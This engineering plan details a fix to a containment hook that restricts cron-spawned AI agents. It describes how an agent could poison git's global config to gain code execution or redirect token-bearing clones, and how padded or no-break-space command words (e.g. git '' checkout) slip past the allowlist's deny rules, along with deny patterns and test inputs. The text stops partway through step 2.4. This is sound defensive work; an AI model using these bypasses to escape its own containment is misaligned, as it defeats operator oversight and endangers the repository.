---
title: "fix(security): cron containment protects the git global config, pins GIT_CONFIG_GLOBAL in every cron spawn, and denies irregular git/gh command words"
type: fix
date: 2026-11-16
slug: fix-cron-gitconfig-containment
branch: feat-one-shot-12757-cron-gitconfig-containment
issue: 12757
closes: 12757
ref: [12757, 9601]
priority: p1
domain: engineering
brand_survival_threshold: single-user incident
requires_cpo_signoff: true
lane: cross-domain
---

# fix(security): cron containment protects the git global config, pins GIT_CONFIG_GLOBAL in every cron spawn, and denies irregular git/gh command words

`Closes #12757` goes in the PR body, never the title. `Ref #9601` (the agent security hardening epic) is a
reference only. The PR must not close the epic.

Spec lacks valid lane: — defaulted to cross-domain (TR2 fail-closed).

## Enhancement Summary

**Deepened on:** 2026-11-16.
**Sections enhanced:** 14. They are Phases 0-3, Guards 1-3, User-Brand Impact, Observability, Acceptance Criteria,
Test Scenarios, Success Metrics, Dependencies & Risks, and Scope Check.

**Agents used:**
- Plan review: dhh-rails-reviewer, kieran-rails-reviewer, code-simplicity-reviewer, architecture-strategist,
  spec-flow-analyzer, and the CTO (devex lens).
- Deepen: test-design-reviewer, user-impact-reviewer, learnings-researcher, and a verify-the-negative/self-audit
  pass.
- Rulings: three CTO rounds (G1-G7, H1-H6).
- The security-sentinel seat was stopped by model safeguards before it reported. Phase 6 (AC12) runs it on the real
  diff.

**Gates passed:**
- 4.6 User-Brand Impact
- 4.7 Observability (the YAML parses; the probe is `node`, a literal, and under 15s)
- 4.8 PAT check
- 4.11 Guard Contract (lint rc=0)
- 4.12 Scope Check
- Not triggered: 4.9 UI, 4.10 encryption posture and 4.13 task design.
- Every cited issue, PR, rule ID and ADR was resolved live.

### Key Improvements
1. **The NBSP-led `git` test rows were wrong.** `splitSegments` trims U+00A0 before tokenising, so those rows would
   have failed against a correct implementation. They are replaced by between-word NBSP forms, a position-2 gh row,
   a separator table, and a per-segment anti-vacuity check (Kieran P0).
2. **The census is now on the TypeScript compiler API** and checks bindings, not names. Its stored maps are keyed on
   identity and report diffs. Row 4c is widened to git/gh/bash/sh/env, and new row 4d rejects post-construction
   `GIT_CONFIG_*` writes. It found two missed token-bearing git spawns in `cron-github-cidr-refresh.ts`, which are now
   Class C. The four bash helpers are pinned through `withCronGitConfigPin`, which keeps a `/dev/null` pin.
3. **Observability that can fail:**
   - An identity-file probe and an XDG-residual probe, transition-latched, report to Sentry.
   - The over-deny metric `cron-containment-new-rule-deny` is built from the hook's own classifier. The deny reason
     never left the host before.
   - AC14 is now a falsifiable baseline comparison plus a `bot-fix/attempted` join.
4. **Residuals stated honestly:**
   - The pin does not cover XDG `ignore`/`attributes`, so Guard 1 is their barrier.
   - The founder-workspace git spawns and the agent-session read-write `~/.gitconfig` bind are a #9601 follow-up.
   - Two unhooked crons are named, controlled by `--allowedTools`.
   - ADR-287's K2 text gets a cross-reference.

### New Considerations Discovered
- Real git 2.56 honours `$HOME/.config/git/ignore` with `GIT_CONFIG_GLOBAL=/dev/null` set (architecture-strategist).
- `bot-fix/attempted` makes an over-denied issue skip permanently, even after a revert. Recovering it needs an
  operator-authorised label removal.
- `cron-daily-triage` and `cron-follow-through-monitor` run without the containment hook. That is safe today only
  because their `--allowedTools` lists admit no Write/Edit/git.

## Overview

The #12705 verification pass found two linked gaps in the cron containment layer, and this plan closes both.

- **F2, the entry point.** The cron containment hook
  (`apps/web-platform/server/inngest/cron-bash-allowlist-hook.mjs`) gates Write/Edit/MultiEdit only through
  `WRITE_PROTECTED_PATTERNS`, and that list has no git-config entry. A cron agent can therefore write
  `$HOME/.gitconfig`. No cron child-process env pins `GIT_CONFIG_GLOBAL`, so git reads that file in three places:
  the agent's own allowlisted git (`core.fsmonitor` turns `git status` into code execution), the server-side
  clones of the same run, and the clones of later runs. `HOME` persists across runs for the life of the container,
  so a `url.<x>.insteadOf` written in run N would redirect run N+1's clone. That clone URL carries a GitHub App
  installation token that can write to `jikig-ai/soleur`.
- **F1, which needs F2.** `gitVerbReason` reads the raw `tokens[1]`, but the allowlist matches the
  whitespace-normalised join. A sub-command token that is empty, padded, or led by a no-break space (`git ''
  checkout`, `git ' checkout'`, `git checkout` with a U+00A0 before the word) passes the allowlist and skips the
  checkout/switch/push/add/commit rules. Git rejects such a token unless the global config sets
  `help.autocorrect=immediate`, which F2 makes possible. A scratch clone lost `apps/` that way.

The fix has three parts. Write-protect `.gitconfig` and `.config/git`. Pin `GIT_CONFIG_GLOBAL` to the image-owned
identity file, and set `GIT_CONFIG_NOSYSTEM=1`, in every cron child-process env that can run git: at the two runtime chokepoints (`spawnClaudeEval`,
`spawnSimple`), at 26 env literals and at 7 git call sites that inherited the process env. Deny any git or gh command
whose command words are irregular (empty, padded, quoted with spaces, or containing a no-break space). Then the raw words the deny rules read are always the words the
allowlist matched. New census tests make sure a future cron cannot drop the pin.

Reproduced on main during planning. Under `env -i`, the hook binary given a Write to `/home/soleur/.gitconfig`
printed `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}`. The same command is
the `discoverability_test` below, and after the fix it must print `protected-path write`.

**Prod HOME:** assumed writable per the Dockerfile and deploy flags; not checked live. That exact sentence goes in
the PR body. The priority stays P1 because of that assumption, as the CTO ruled.

## Research Reconciliation — Spec vs. Codebase

| Spec / brief claim | Codebase reality | Plan response |
|---|---|---|
| "at least 10 cron files" pass `HOME: process.env.HOME` (issue) / "About 23 server files" (brief) | `git grep -n "HOME: process.env.HOME" -- apps/web-platform/server` = **26 sites in 23 files**. During planning the CTO consult was told "27 sites"; the recount gives 26 (the earlier figure double-counted). | The census pins exactly 26 sites, with the 23-file set as the identity anchor (Guard 3). The CTO's "floor of 27" is corrected to 26. This is a mechanical fix of a miscount, recorded in `decision-challenges.md`. |
| Roadmap-review and bug-fixer spawn envs are "in `_cron-claude-eval-substrate.ts`" (issue) | Their **allowlists** (`CRON_BASH_ALLOWLISTS`) are in the substrate. Each spawn **env** is a per-cron `buildSpawnEnv` in `cron-roadmap-review.ts:191` and `cron-bug-fixer.ts:197`, spread by `spawnClaudeEval` at substrate `:1557`. | Pin at the `spawnClaudeEval` chokepoint and in each per-cron literal. |
| "matching the set in `server/agent-env.ts`" (issue) | `GIT_CARRIER_ENV_PIN` (`agent-env.ts:80`) also carries `GIT_CONFIG_COUNT`/`safe.bareRepository`. The CTO ruled that pair OUT, and ruled any `agent-env.ts` change OUT. | A new two-key `CRON_GIT_CONFIG_PIN` in `host-git.ts`. `agent-env.ts` is untouched. |
| "Add `GIT_CONFIG_NOSYSTEM` only if `agent-env.ts` already sets it" (issue) | It does (`GIT_CARRIER_ENV_PIN.GIT_CONFIG_NOSYSTEM: "1"`). The image sets no system-level config (no `git config --system` in the Dockerfile). | Included in the constant. |
| `.gitconfig` is already protected (it is in `SECRET_PATH_PATTERNS`, brief note) | `decide()` consults `SECRET_PATH_PATTERNS` only for `Read`/`Glob`/`Grep` (the `case "Read"` arm). `Write`/`Edit`/`MultiEdit` consult only `WRITE_PROTECTED_PATTERNS` (the `case "Write": case "Edit": case "MultiEdit":` arm). | The gap is real, and the reproduction above confirms it. Add both patterns to `WRITE_PROTECTED_PATTERNS`. |
| The pin keeps the fallback commit identity (issue) | `Dockerfile:163` writes `agent.gitconfig` with github-actions[bot], and the build asserts git derives that identity (`:165`). `Dockerfile:467` sets the same identity in the HOME global. Nothing at runtime writes `~/.gitconfig` (`git grep "config --global\|setup-git"` finds only the Dockerfile). | Commit identity does not change. No Dockerfile change (OUT). |

## Research Insights

**Premise validation (Phase 0.6).**

- #12757 is open, with labels P1, `type/security` and `meta/machinery`. #9601 is open (the epic).
- `collision-precheck.sh 12757` hit PR #12806. That PR is this branch's own draft: same `headRefName`, zero
  files, body "Draft PR created automatically", so it is not a duplicate. No other foreign `proc.sh` run was found.
- Every symbol the brief cites exists on this branch, which sits at main plus an init commit:
  `WRITE_PROTECTED_PATTERNS` `:416`, `SECRET_PATH_PATTERNS` `:386`, `gitVerbReason` `:590`,
  `normalizeSegmentWhitespace` `:698`, and `AGENT_GIT_GLOBAL_CONFIG` `host-git.ts:31` (re-exported by `agent-env.ts:79`).
- ADR corpus grep for the mechanism (`GIT_CONFIG_GLOBAL`, `agent.gitconfig`, `WRITE_PROTECTED`, `cron containment`):
  no ADR rejects it. ADR-278 `:106` leaves `GIT_CONFIG_GLOBAL`/`NOSYSTEM` undenied in the agent sandbox because they
  neutralise config, which is consistent with this plan. ADR-033 is the cron spawn ADR, and its I7(a) lists the
  Write/Edit self-protection this plan extends.
- What turned out stale: the "27 sites" figure (it is 26), the issue's "at least 10 cron files", and the issue's
  location claim. See the table above.

**Property List (Phase 0.6b).**

- P1: a cron agent cannot write any file git reads as global config (`$HOME/.gitconfig`, `$HOME/.config/git/*`)
  through Write/Edit/MultiEdit.
- P2: no git process started from a cron, whether by the agent, a script, or the server, reads `$HOME`'s gitconfig
  or the system gitconfig, even if one was written.
- P3: a cron cannot drop P2 by adding or editing a spawn site. A new site without the pin goes red in CI.
- P4: the git and gh rules in the hook read the same command words the allowlist matched, so whitespace
  irregularity in a command word cannot get a command past a rule.
- P5: no command that is denied today is allowed after the change, and no plain-spaced command that an allowlist
  admits today is denied.
- P7: the image-owned identity file, which the pin makes the single trust root of cron git config, cannot be
  written through the hook either.
- P6: commit identity is unchanged.

**Cut List (Phase 0.6b).**

- A new allowlist directive or per-cron flag for the pin: cut. It buys nothing over P2, and the chokepoints plus
  the shared constant cover it.
- Reusing `GIT_CARRIER_ENV_PIN`: cut. It carries the OUT-of-scope `GIT_CONFIG_COUNT` pair.
- `/dev/null` for the pin: cut. It would lose the fallback identity (learning
  `2026-11-09-a-guard-rewrite-closed-the-reported-bypass-and-opened-two-narrower-ones.md`), and the issue requires
  the identity file.
- Write-protecting all of `.config/`: cut. The CTO named exactly two patterns. `.config/gh` write-protection is not
  part of this property.
- A runtime spawn-time env self-test: cut. The behavioural census rows prove delivery at the two chokepoints in
  CI, at no runtime cost.

No mechanism in the ask was found to be already covered on main.

**Value-proposition measurement (0.6c):** not applicable. This is a security fix, not a cost saving.

**Relevant files** (absolute root `apps/web-platform/`):

- `server/inngest/cron-bash-allowlist-hook.mjs`: `filingShape` `:244`, `SECRET_PATH_PATTERNS` `:386`,
  `WRITE_PROTECTED_PATTERNS` `:416`, `tokenize` `:517` (splits on space and tab only, as bash does),
  `gitVerbReason` `:590`, `normalizeSegmentWhitespace` `:698`, `segmentMatchesAllowlist` `:702`, `decide()` `:936`
  (in its Bash segment loop: `gitVerbReason(tokens)`, the `gh api` `hasDotSegment` branch, `const allowlisted`, the
  `filingJustificationReason(` gate; then the `case "Write"` arm), and `main()` (CLI, argv[2] = allowlist file).
  Symbol anchors, not line numbers (`cq-cite-content-anchor-not-line-number`): the line numbers moved during planning.
- `server/host-git.ts:31`: `AGENT_GIT_GLOBAL_CONFIG`. A deliberate leaf that imports only `node:*` and
  `_git-hardening`.
- `server/inngest/functions/_cron-claude-eval-substrate.ts`: `spawnSimple` `:281` (`env: opts.env ?? process.env`
  `:299`), `CRON_BASH_ALLOWLISTS` `:420` (roadmap-review `:421`: git status/add/commit/checkout/switch/push/rev-parse;
  bug-fixer `:540`: git status/add/commit/checkout/worktree/branch/push, **no switch**), clone `:1179`, `setOriginToken`
  set-url `:1277`, and the `spawnClaudeEval` env spread `:1555-1558`.
- `server/inngest/functions/_git-hardening.ts`: `GIT_HARDENING_ENV` (`/dev/null` pins). A no-import leaf that
  host-git imports, so the new constant cannot live there.
- Already pinned stricter, and kept on `/dev/null`: `_cron-safe-commit.ts:358,380`, `cron-compound-promote.ts:740-747`
  (`spawnGitCapture`), and `cron-content-vendor-drift.ts:477` (`gitIsolatedEnv`, used by `spawnGit :495` and
  `spawnGitStdout :519`, which spread `opts?.env` **after** the `/dev/null` keys. No caller passes an env today).

**Census of cron child-process env sources** (`git grep`, 2026-11-16). This is the population for P2 and P3.

| # | Site | Class | What it spawns |
|---|---|---|---|
| 1 | `_cron-claude-eval-substrate.ts:1555-1558` `spawnClaudeEval` env | chokepoint (agent) | `claude --print` for every agent cron |
| 2 | `_cron-claude-eval-substrate.ts:281-299` `spawnSimple` | chokepoint (git/gh) | clone `:1179`, set-url `:1277`, event-ship-merge `:173` (gh pr checkout), `:198`, `:214` (git) |
| 3-20 | `buildSpawnEnv` `HOME:` literal in `cron-agent-native-audit.ts:165`, `cron-architecture-diagram-sync.ts:155`, `cron-bug-fixer.ts:200`, `cron-campaign-calendar.ts:163`, `cron-community-monitor.ts:641`, `cron-competitive-analysis.ts:206`, `cron-content-generator.ts:175`, `cron-daily-triage.ts:205`, `cron-follow-through-monitor.ts:336` (also reused for `gh label create` `:415` and `execFileSync gh` `:523`), `cron-growth-audit.ts:161`, `cron-growth-execution.ts:182`, `cron-legal-audit.ts:182`, `cron-roadmap-review.ts:194`, `cron-seo-aeo-audit.ts:176`, `cron-ux-audit.ts:133`, `event-ship-merge.ts:87`, `oneshot-f2-defer-gate-review.ts:68`, `oneshot-recheck-4217-calibration.ts:63` | A: agent env literal (18) | the agent, via `spawnClaudeEval` |
| 21-28 | `cron-content-publisher.ts:158` (`buildPublisherEnv`), `cron-content-vendor-drift.ts:1039`, `:1249` (classifier runs `git merge-base`), `cron-github-cidr-refresh.ts:190`, `cron-rule-prune.ts:205`, `cron-weekly-analytics.ts:137`, `event-ship-merge.ts:180`, `:194` | B: non-agent env literal (8) | bash scripts, gh, git |
| 29 | `cron-strategy-review.ts:127` `spawn("git", ["clone", …])`, no env | C: inherits `process.env` | token-bearing clone |
| 30 | `cron-compound-promote.ts:710-718` `spawnGit` (`{ stdio: "ignore", ...opts }`) | C | clone `:842`, apply `:916`/`:927`, checkout `:2632` |
| 31 | `cron-content-publisher.ts:105` `spawnGit` | C | git |
| 32 | `cron-rule-prune.ts:71` `spawnGit` | C | git |
| 33 | `cron-weekly-analytics.ts:45` `spawnGit` | C | git |
| 34-35 | `cron-github-cidr-refresh.ts:123` `runProc("git", ["clone", …token URL…])` and `:204` `runProc("git", ["status", …], { cwd })`; `runProc` (`:84`) spreads `opts` with no env default | C: inherits `process.env` | token-bearing clone, status (found by the sharp-edges pass with a callee-agnostic grep) |
| - | `cron-compound-promote.ts:747`, `cron-content-vendor-drift.ts:495`/`:519`, `_cron-safe-commit.ts:358`/`:380` | already `/dev/null` | kept (CTO F-A) |

Class A plus Class B gives the 26 `HOME:` literals. Outside the census: `scripts/dev-probe-destroy-ask.ts:185` (a dev
probe, not a cron), `test/plugin-stop-hooks-web-parity.test.ts:92` (a test), and the `server/` non-inngest git
callers. Most of those (`session-sync.ts`, `git-data-*.ts`, `worktree-config-seed.ts`) go through
`hostGitInvocation`, which pins `GIT_CONFIG_GLOBAL`. Not all do: `server/git-config-atomic.ts` (called from
`workspace.ts`) and `server/push-branch.ts` spawn git with no env and inherit the container HOME. Those are
founder-workspace paths, a residual recorded in ADR-033 with a follow-up under #9601 (CTO G4), and not in this PR.

The four bash script spawners (`spawnScriptCapture` in content-publisher `:196`, content-vendor-drift `:680`,
rule-prune `:78`, weekly-analytics `:50`) take `env: opts.env` with a required `env`, and every caller passes one of
the Class B literals. Of the scripts, only `vendor-drift-classify.sh` runs git (`:75`, `git merge-base`). `rule-prune.sh`,
`content-publisher.sh`, `weekly-analytics.sh`, `gen-github-egress-cidr.sh` and `notice-frontmatter.sh` do not
(repo-research). They still get the pin through their literal, so a future `git` line in any of them is covered.

**Test infrastructure** (repo-research):

- The static-census model is `test/server/inngest/cron-budgets.test.ts`. It uses `fs.readdirSync` over
  `server/inngest/functions`, comment-stripping, a floor, and exact set equality. `cron-substrate-imports.test.ts` is
  a second precedent. Caveat: `oneshot-*` and `event-ship-merge.ts` are not `cron-*`, so the census keys on the
  `HOME:` key and on spawn-site regexes, not on the filename prefix.
- `test/server/inngest/cron-claude-eval-substrate-exit.test.ts` already mocks `node:child_process` (`spawnMock`,
  `:18-28`) and drives `spawnClaudeEval` with `buildSpawnEnv: () => process.env` (`:67`). The new chokepoint rows go
  there and read `spawnMock.mock.calls[0][2].env`.
- Three tests assert the exact `process.env.*` key set of a `buildSpawnEnv`: `oneshot-f2-defer-gate-review.test.ts:85`,
  `event-ship-merge.test.ts:151` and `oneshot-recheck-4217-calibration.test.ts:83`. They count only `process.env.NAME`
  tokens, so `...CRON_GIT_CONFIG_PIN` does not turn them red.
- Vitest's `unit` project includes `test/**/*.test.ts` (`vitest.config.ts`). A test that reads only
  `apps/web-platform` stays app-local; it does not need `repo-wide-suites.ts`.
- Imports in `server/inngest/functions/*` use `@/server/...` (286 occurrences). No inngest function imports `host-git`
  today. `.dependency-cruiser.cjs` has only client-to-server rules, so the new import is allowed.

**Institutional learnings applied** (learnings-researcher):

- `security-issues/2026-11-15-a-deny-list-over-git-option-parsing-lost-to-abbreviations-and-the-framing-hook-tokenised-differently-from-containment.md`:
  a second parser over the same command gives divergent verdicts. Use the exported `normalizeSegmentWhitespace` and
  add no new tokenizer or flag deny-list.
- `2026-11-09-a-guard-rewrite-closed-the-reported-bypass-and-opened-two-narrower-ones.md`: a `/dev/null` global
  loses the identity. Grade the rewritten guard against its predecessor, which is why P5 exists and why the
  command-word rule (CTO A1) fails closed instead of re-reading the command a second way.
- `2026-10-15-a-census-that-stubs-the-host-verb-cannot-see-the-env-the-step-forgot-to-pass.md`: a census needs an
  executed row, not only a source row. That gives behavioural rows 1 and 3 and the real-git row 5.
- `2026-11-11-a-census-keyed-on-the-client-name-missed-every-call-split-across-lines.md`: key the predicate on the
  object-literal span, not on line-local regexes.
- `2026-09-29-a-source-census-that-checks-the-arguments-name-not-its-binding-and-a-closed-file-list-both-let-guarded-egress-through.md`:
  sweep the tree open-world, and use the file set as an anchor, not as the enumeration.
- `2026-10-12-the-guards-own-normalizer-is-attack-surface-treat-text-preprocessing-as-fail-open.md` and
  `2026-11-09-a-producer-check-was-true-of-the-system-and-false-of-the-population-the-hook-registered-in.md`: the
  the normaliser never replaces the raw tokens the deny rules read. The shape rule only reads the normalised view to
  decide whether a segment is git or gh, and any disagreement between the views is a deny, so normalisation can only
  add denies.
- `2026-11-10-a-redirect-guard-was-widened-one-level-at-a-time-and-reviewed-into-the-class-in-two-rounds.md`: list
  the class of files from the mechanism. Git reads the global config from `$GIT_CONFIG_GLOBAL`, or else from
  `$HOME/.gitconfig` and `$XDG_CONFIG_HOME/git/config` (default `$HOME/.config/git/config`). `include`/`includeIf`
  targets are reachable only from those files, and once the files are protected and the pin is set, they are
  unreachable. One exception was measured by real git 2.56: the defaults for `core.excludesFile` and
  `core.attributesFile` are resolved from XDG (`$HOME/.config/git/ignore`, `attributes`) whatever
  `GIT_CONFIG_GLOBAL` says. Those two files cannot execute anything, and Guard 1 is their barrier (CTO G3, row 5b).

**External research:** skipped. The mechanism (`GIT_CONFIG_GLOBAL`, git ≥ 2.32) is already pinned and verified in
this repo (#9600; `Dockerfile:154` floor ≥ 2.38; the `:165` build-time identity assertion). Strong local context.

**Functional overlap (1.5b):** functional-discovery found no community artifact that protects git global config or
pins `GIT_CONFIG_GLOBAL`. Nothing was installed. Community discovery (1.5) was skipped: TypeScript is covered.

**CLI tokens prescribed:** `GIT_CONFIG_GLOBAL` / `GIT_CONFIG_NOSYSTEM` are already exercised in-repo by
`Dockerfile:165` (`GIT_CONFIG_GLOBAL=… GIT_CONFIG_NOSYSTEM=1 git var GIT_AUTHOR_IDENT`) and asserted by
`test/dockerfile-git-version-floor.test.ts`. Source for the semantics (the given file replaces the global level,
both `~/.gitconfig` and the XDG file): git-config(1) ENVIRONMENT
(<https://git-scm.com/docs/git-config#ENVIRONMENT>). Row 5 measures this on the test host.

## Problem Statement / Motivation

The cron containment hook is the only fail-closed boundary for cron agents (ADR-033 I7). Every cron runs with
the sandbox off. The hook's self-protection list was built to stop the agent from rewriting the hook, its allowlist
and its settings (D-new-2). It missed a file that is just as load-bearing: git's global config. Git runs a command
named in that config on every `status`, a script named there on a mistyped command when `help.autocorrect` is set,
and a URL rewrite there on every fetch. The verifier showed all three in a scratch clone. With `HOME` persistent,
one poisoned run reaches every later run's token-bearing clone. That is a supply-chain path into the repository the
plugin ships from.

## Proposed Solution

### Phase 0: RED tests first (`cq-write-failing-tests-before`)

Write every new test row below and run it against the unchanged source, then run the whole of
`test/server/inngest/` (not only the named suites). Record the run in the PR body. A RED counts only as an assertion
failure: a row that fails with a `TypeError` or `undefined` import, because `CRON_GIT_CONFIG_PIN` or
`agentGitConfigReadable` does not exist yet, is recorded as "fails to load", not as RED. Pre-fix expectations:
- **Must pass pre-fix (controls):**
  - row 4b
  - row 5's control arm and row 5b
  - every Guard 1 and Guard 2 must-pass row
  - the allowlist census
  - the raw-rule P5 rows
  - the Read-secret regression row
- **Must go RED pre-fix:**
  - every Guard 1 deny row
  - every irregular command-word row, which is allowed or denied with a different reason today. The bug-fixer
    `switch` rows are tagged "reason-precedence only": `git switch` is already denied there as not allowlisted.
  - rows 2, 4 and 4c for the unpinned sites
  - row 5's pinned arm
  - rows 1, 3 and 6 (which fail to load until the symbols exist) Also run
`test/server/inngest/cron-bug-fixer.test.ts` straight after adding the `@/server/host-git` import to
`cron-bug-fixer.ts`: its `node:fs` mock exports only `existsSync`/`readFileSync`, and `host-git.ts` imports
`lstatSync`/`readdirSync`. If it goes red, switch that mock to an `importOriginal` partial. Seed census row 4c's
exclusion list from the first sweep (3.1).

### Phase 1: Hook (`cron-bash-allowlist-hook.mjs`)

Land Phase 1.2 (the shape rule) in its own commit, separate from 1.1 and from Phase 2, so it can be reverted alone
(see Dependencies & Risks).

1.1 Add three entries to `WRITE_PROTECTED_PATTERNS`, each with a one-line comment citing #12757:
`/(^|\/)\.gitconfig$/`, `/(^|\/)\.config\/git(\/|$)/`, and the trust-root directory
`/(^|\/)usr\/local\/share\/soleur(\/|$)/` (CTO A3). The hook is plain `.mjs` and cannot import
`AGENT_GIT_GLOBAL_CONFIG` from `host-git.ts`, so a test imports the constant and asserts this pattern matches it (3.3).
The `.config/git` entry assumes `XDG_CONFIG_HOME` is unset; nothing under `server/` sets it (note this beside the
pattern).

In the `case "Write": case "Edit": case "MultiEdit":` arm, test both the raw path and `posix.normalize(path)`
against `WRITE_PROTECTED_PATTERNS` (extend the existing `import { dirname, resolve } from "node:path"` with `posix`).
Normalisation can only add denies. It closes `/home/soleur/.config//git/config`, `/home/soleur/.config/./git/config`
and `/usr/local//share/soleur/agent.gitconfig`, which the two unanchored-at-end patterns miss on the raw string.

1.2 Add a command-word shape rule (CTO A1, which amends binding IN item 4 and supersedes F-D, F-E and F-H) beside
`gitVerbReason`:

```js
// cron-bash-allowlist-hook.mjs — #12757 F1. The allowlist matches normalizeSegmentWhitespace(tokens.join(" ")), but
// every git/gh rule below reads RAW tokens at fixed positions. Every git/gh allowlist line is a plain `git <sub>`,
// `gh <group> <verb>` or `gh api <path>` (CRON_BASH_ALLOWLISTS), so requiring the raw command words at those
// positions to be plain makes the two views agree on every word a rule keys on. Fail closed.
const COMMAND_WORD_RE = /^[A-Za-z0-9-]+$/;
const visibleWord = (w) =>
  w === undefined ? "missing" : JSON.stringify(w).replace(/[^\x20-\x7e]/g, (c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0"));
function commandWordShapeReason(tokens) {
  const norm = normalizeSegmentWhitespace(tokens.join(" ")).split(" ");
  const verb = norm[0];
  if (verb !== "git" && verb !== "gh") return null;
  const isApi = verb === "gh" && norm[1] === "api";
  const n = verb === "git" || isApi ? 2 : 3;
  const form = verb === "git" ? "git <sub>" : isApi ? "gh api <path>" : "gh <group> <verb>";
  for (let i = 0; i < n; i++) {
    const w = tokens[i];
    if (i > 0 && typeof w === "string" && w.startsWith("-"))
      return `flag before the sub-command in a ${verb} command (word #${i + 1} ${visibleWord(w)}) -- write \`${form}\` first, then flags`;
    if (typeof w !== "string" || (i === 0 ? w !== verb : !COMMAND_WORD_RE.test(w)))
      return `irregular command word in a ${verb} command (word #${i + 1} ${visibleWord(w)}) -- write \`${form}\` with plain spaces and no quotes around the command words`;
  }
  return null;
}
```

The reason names the word's position and shows it with non-printing characters escaped, because an NBSP is invisible
to the agent that typed it and a reason that does not point at it invites a retry loop (CPO condition). The hint
names the right shape for `gh api`. A bare `git` or `gh` reports word #2 as `missing`. A flag-led command
(`git -c k=v status`, `gh -R o/r issue list`) gets its own reason; none is allowlisted today, so this changes only
the reason text, from "not allowlisted".

Call it in `decide()`'s Bash segment loop immediately after the `argumentInjectionReason` check and before
`gitVerbReason`: `const shapeReason = commandWordShapeReason(tokens); if (shapeReason) return denyDecision(shapeReason);`.
`gitVerbReason`, the `gh api` dot-segment branch and the filing gate then run unchanged, on raw tokens. The dot-segment
check already splits each token on `\s` (`hasDotSegment`), so the `gh api` endpoint needs nothing new.

Checked consequences:
- git does not trim argv, so `git add ' -A'` and `git commit ' -a'` pass the hook and reach git as literal
  pathspecs, not flags. That is inert once `help.autocorrect` is unreachable (Phase 2).
- `git push --repo "origin evil"` stays denied by the existing raw rule.
- Arguments after the command words are not shape-checked, so no honest commit message is affected.
- A leading NBSP before `git` is removed by `splitSegments`' `.trim()` (JS `trim` strips U+00A0) before tokenising,
  and bash would look for a command named ` git` and fail. So that form is no bypass and gets no row. The NBSP
  forms that matter are between words (`git checkout`, `git  checkout`).

1.3 Do not change `tokenize`, `normalizeSegmentWhitespace`, `splitSegments`, `segmentMatchesAllowlist`,
`gitVerbReason`, `filingShape` or `filingJustificationReason`. The framing hook (`cron-gh-output-framing-hook.mjs`)
imports `tokenize`, `splitSegments` and `normalizeSegmentWhitespace` (ADR-287 D1), and its differential suite must
stay green unchanged. `commandWordShapeReason` stays module-private and is tested through `decide()`. CTO G1: add a
one-line dated cross-reference to ADR-287's addendum item 2 ("`gh "" pr view`, `gh issue "view 1"` and NBSP-in-token
shapes are now denied by containment (#12757); framing them is redundant but harmless"), and correct the matching
comment in `test/server/inngest/cron-gh-output-framing-hook.test.ts` (the K2 block). Do not change ADR-287's decisions.

### Phase 2: The pin

2.1 `server/host-git.ts`, directly under `AGENT_GIT_GLOBAL_CONFIG`:

```ts
/**
 * #12757 — every cron child-process env (agent, script, server-side git) carries this, spread LAST, so HOME's
 * writable ~/.gitconfig and the system gitconfig are never read. Identity-only file, same identity as today.
 * Identity-only: no command-scope config pairs here (out of scope; command-scope config beats local identity).
 */
export const CRON_GIT_CONFIG_PIN: Readonly<{ GIT_CONFIG_GLOBAL: string; GIT_CONFIG_NOSYSTEM: "1" }> = Object.freeze({
  GIT_CONFIG_GLOBAL: AGENT_GIT_GLOBAL_CONFIG,
  GIT_CONFIG_NOSYSTEM: "1",
});

/** #12757 (CTO G2/H1) — git treats a missing/unreadable global as empty, so a broken identity file is silent. Pure, uncached: re-probed per call. */
export function agentGitConfigReadable(path: string = AGENT_GIT_GLOBAL_CONFIG): boolean {
  try { accessSync(path, constants.R_OK); return true; } catch { return false; }
}

/** #12757 (CTO H4) — the XDG ignore/attributes defaults are read whatever GIT_CONFIG_GLOBAL says (residual G3). */
export function xdgGitResidualPresent(home: string = homedir()): boolean {
  return ["ignore", "attributes"].some((f) => { try { return statSync(join(home, ".config/git", f)).isFile(); } catch { return false; } });
}

/** #12757 (CTO H5) — pin an env, but keep a caller's stricter /dev/null global (F-A). */
export function withCronGitConfigPin(env: NodeJS.ProcessEnv): NodeJS.ProcessEnv {
  return env.GIT_CONFIG_GLOBAL === "/dev/null"
    ? { ...env, GIT_CONFIG_NOSYSTEM: "1" }
    : { ...env, ...CRON_GIT_CONFIG_PIN };
}
```

The imports grow to `accessSync`, `constants`, `statSync` (`node:fs`), `homedir` (`node:os`) and `join`, which is
already imported.

The docstring above the constant also says: "Every cron env literal under server/inngest must end with
...CRON_GIT_CONFIG_PIN. Enforced by test/server/inngest/cron-spawn-git-config-pin.test.ts." `host-git.ts` stays a
leaf: the probe returns a boolean and imports only `node:fs` (`accessSync`, `constants`). The Sentry report lives at
the chokepoints (2.2), which already import `reportSilentFallback` from `@/server/observability`, so no edge or cycle
is added.

2.2 Chokepoints, applied after any caller env so they win:

- `_cron-claude-eval-substrate.ts:1555-1558`: `env: { ...buildSpawnEnv(installationToken),
  CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1", ...CRON_GIT_CONFIG_PIN }`.
- `_cron-claude-eval-substrate.ts:299`: `env: { ...(opts.env ?? process.env), ...CRON_GIT_CONFIG_PIN }`.
- At both chokepoints, before spawning, call `agentGitConfigReadable()` and `xdgGitResidualPresent()` on every call.
  Each result feeds a latch in the substrate that fires on a transition (CTO H1, per learning 2026-10-12: a cached
  "ok" must expire). The latch is module-level, shared by both chokepoints, and re-armed when the probe reads ok
  again.
  - On an ok-to-bad transition of the identity probe, call `reportSilentFallback` with op `cron-git-config-pin` and
    the message "agent git identity file missing or unreadable; cron git commits will fail with Author identity
    unknown".
  - On an absent-to-present transition of the XDG probe, call `reportSilentFallback` with op
    `cron-git-xdg-config-present` and the message "$HOME/.config/git/ignore or attributes exists; git reads it
    whatever the pin says".
  - Neither report blocks the spawn, and neither carries a path or file contents.

2.3 The 26 `HOME:` literals in the census table (rows 3-28): add `...CRON_GIT_CONFIG_PIN` as the **final** entry of
the literal. In `cron-content-publisher.ts` (`buildPublisherEnv`), the literal is filled by a loop after it is built.
Fold the loop into the literal as `...Object.fromEntries(PUBLISHER_ENV_KEYS.map((k) => [k, process.env[k]]))`,
keeping undefined values exactly as the loop does today (`env[key] = process.env[key]`, no filter;
`cron-content-publisher.test.ts` asserts `key in env` for all 12 keys), followed by `...CRON_GIT_CONFIG_PIN` as the
last entry. The census then has no special case.

2.4 Class C git helpers (rows 29-35): `cron-strategy-review.ts:127` gets `env: { ...process.env,
